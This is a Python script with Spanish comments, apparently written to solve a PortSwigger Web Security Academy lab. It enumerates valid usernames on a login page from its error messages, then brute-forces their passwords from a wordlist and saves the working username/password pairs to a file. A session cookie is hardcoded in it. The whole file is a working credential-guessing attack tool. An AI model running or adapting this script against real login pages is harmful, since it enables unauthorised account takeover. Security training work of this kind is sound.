#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import sys
import argparse
from urllib.parse import urlparse

def main(url):
    #verifico que se pase correctamente como parametro una url
    if url:
        parsed_url = urlparse(url)
        #Con urlparse busco sacar el centro de la url ya que este es el Host , tambien se podria haber hecho con bash pero para no mezclar.
        center = parsed_url.netloc
        headers = {
            'Host': center,
            'Cookie': 'session=FXvR6QDGrInI5TTxVPhBX2j3k0xgQRIc',
            'Content-Length': '28'
        }
        with open("usuarios_noborrar.txt", "r") as archivoUsuarios:
        	# Leer todas los usuarios por linea del archivo usuarios
           	lineasUsuarios = archivoUsuarios.readlines()
        # Invoco a la funcion con los respectivos parametros .
        CrearFicheroUsuarios(lineasUsuarios,url,headers)
        with open("passwords_db.txt","r") as archivoPasswords:
            # Leer todas las contraseñas por linea del archivo password_db.txt
            lineasPassword = archivoPasswords.readlines()
        CrearFicheroUserPassword(lineasPassword,url,headers)
    else:
        print("insertar URL ejemplo : scritp.py --url http://portswigger.com")

# Esta funcion se encarga de crear un archivo con la respectiva contraseña de cada usuario , 
#una vez que encuentra la contraseña de dicho usuario simplemente hace un break. y sigue con el proximo
def CrearFicheroUserPassword(LPassword,url,headers):
    total_contrasenas = len(LPassword)
    progreso_actual = 0

    with open("usuarios_encontrados.txt", "r") as archivoUsuarios:
        usuarios = archivoUsuarios.readlines()
        total_usuarios = len(usuarios)
    with open("usuarios_passwords_encontrados.txt", "w") as archivo_salida:
        print('\nPreparando la busqueda de contraseñas ...')
        for usuario in usuarios:
            usuario = usuario.strip()
            print('\nBuscando la contraseña para el usuario ---> '+usuario)
            for contrasena in LPassword:
                contrasena = contrasena.strip()
                    
                # Información
                data = {
                    'username': usuario,
                    'password': contrasena
                }

                # Realizar la solicitud POST
                response = requests.post(url, headers=headers, data=data)
                    
                # Obtener el contenido HTML de la respuesta
                html_content = response.text
                    
                # Analizar el HTML utilizando BeautifulSoup
                soup = BeautifulSoup(html_content, 'html.parser')

                # Buscar la etiqueta <p> con la clase 'is-warning'
                p_tag = soup.find('p', class_='is-warning')
            

                # Verificar si se encontró la etiqueta y si contiene el texto esperado en este caso es necesario usar el none 
                # porque al poner la contraseña correcta para el usuario la etiqueta deja de aparecer por ende la variable p_tag
                # almacena None
                if (p_tag == None):
                    print(f'\nUsuario: {usuario}, Contraseña: {contrasena}\n')
                    archivo_salida.write(f'Usuario: {usuario}, Contraseña: {contrasena}\n')
                    break
    
                # Actualizar el contador de progreso
                progreso_actual += 1
    
                # Actualizar la barra de progreso
                update_progress(progreso_actual, total_usuarios * total_contrasenas)

# Funcion encargada de crear un archivo unicamente con los usuarios , esto es para que no pruebe todas las contraseñas hasta en los usuarios que no existen
# Es decir solo pruebe en los existentes.
def CrearFicheroUsuarios(LUsuarios,url,headers):
    total_usuarios = len(LUsuarios)
    progreso_actual = 0  # Contador de progreso
    print("Preparando la busqueda de usuarios ...")
    with open("usuarios_encontrados.txt", "w") as archivo_salida:
        for linea in LUsuarios:
            usuario = linea.strip()

            # Información
            data = {
                'username':usuario,
                'password':'ss'
            }

            # Realizar la solicitud POST
            response = requests.post(url, headers=headers, data=data)
                
            # Obtener el contenido HTML de la respuesta
            html_content = response.text
                
            # Analizar el HTML utilizando BeautifulSoup
            soup = BeautifulSoup(html_content, 'html.parser')

            # Buscar la etiqueta <p> con la clase 'is-warning'
            p_tag = soup.find('p', class_='is-warning')
            
            # Si el contenido HTML no contiene Invalid username entonces el usuario existe tambien se podria poner == 'Incorrect password'
            if (p_tag.text!='Invalid username'):
                print('\nEl usuario ---> '+usuario+' existe\n')
                archivo_salida.write(usuario+'\n')

            # Actualizar el contador de progreso
            progreso_actual += 1

            # Actualizar la barra de progreso
            update_progress(progreso_actual, total_usuarios)

# Funcion que se encarga de manejar la Barra de progreso.
def update_progress(iteration, total):
    progress = iteration / total
    bar_length = 50
    filled_length = int(bar_length * progress)
    bar = '=' * filled_length + '-' * (bar_length - filled_length)
    sys.stdout.write(f'\rProgreso: [{bar}] {progress * 100:.2f}%')
    sys.stdout.flush()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script de ejemplo con URL como parámetro")
    parser.add_argument("--url", help="URL para procesar")
    args = parser.parse_args()

    main(args.url)
